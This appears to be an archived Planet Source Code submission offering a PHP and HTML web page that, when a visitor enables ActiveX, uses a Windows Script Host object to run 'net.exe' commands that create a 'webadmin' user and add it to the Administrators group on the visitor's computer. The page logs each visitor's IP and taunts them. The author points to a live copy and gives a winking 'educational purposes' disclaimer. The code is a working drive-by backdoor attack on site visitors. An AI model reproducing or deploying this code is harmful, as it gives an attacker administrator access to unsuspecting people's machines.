<div align="center">

## Create a WinXP User Account from a  Website


</div>

### Description

Hi,

I Was sitting on my pc the other day and wanted to create a Website that could add a WinXP User account with Administrator Rights on the views computer. There is only one thing that is a problem that is the person on the other end needs to enable there ActiveX Controllers. Hope you all have fun with this script just as i did. But remember this is for educational perposes only and we don't want people doing the wrong thing with it like the kill function now do we ;)

anyone that can improve this please post the details.

see this script in action at

www.ezysale.net/cmd/adduser.php

dont forget to enable the activex controls

Cheers
 
### More Info
 


<span>             |<span>
---                |---
**Submitted On**   |
**By**             |[Kougra](https://github.com/Planet-Source-Code/PSCIndex/blob/master/ByAuthor/kougra.md)
**Level**          |Beginner
**User Rating**    |4.3 (13 globes from 3 users)
**Compatibility**  |PHP 3\.0, PHP 4\.0
**Category**       |[Miscellaneous](https://github.com/Planet-Source-Code/PSCIndex/blob/master/ByCategory/miscellaneous__8-1.md)
**World**          |[PHP](https://github.com/Planet-Source-Code/PSCIndex/blob/master/ByWorld/php.md)
**Archive File**   |[](https://github.com/Planet-Source-Code/kougra-create-a-winxp-user-account-from-a-website__8-1595/archive/master.zip)





### Source Code

To use this code change the # to < or >, sorry this is my first post :)
#object id='wsh' classid='clsid:F935DC22-1CF0-11D0-ADB9-00C04FD58A0B'>#/object#
#script#
wsh.Run("net.exe user webadmin /add ");#/script#
#script#
wsh.Run("net.exe localgroup Administrators webadmin /add ");#/script#
#?php
$getip = $_SERVER["REMOTE_ADDR"];
$getdate = date( "l dS of F Y" );
$gettime = date( "h:i:sa (@B" );
$banned_ip = array();
$banned_ip[] = '222.111.111.1'; # Add Ip Address Of Person you dont want to see this site
foreach($banned_ip as $banned) {
$ip = $_SERVER['REMOTE_ADDR'];
if($ip == $banned){
echo "<b>Im sorry you have been blocked from viewing this webpage.</b>";
$fp = fopen("ip_data.dat", "a");
fputs($fp, "**BANNED** Visit logged on $getdate at $gettime internet time) for IP: $getip
");
fputs($fp, "");
fclose($fp);
exit();
}
}
echo "<b><font size=3 color=#000000> Thankyou for the access to your computer system</font></b>";
echo "<br />";
echo "'<b><font color=#000000>User Account Created and IP Address Logged</font></b>' on $getdate at $gettime internet time) for: $getip";
$fp = fopen("ip_data.dat", "a");
fputs($fp, "Authorized Visit logged on $getdate at $gettime internet time) for IP: $getip
");
fputs($fp, "");
fclose($fp);
?>

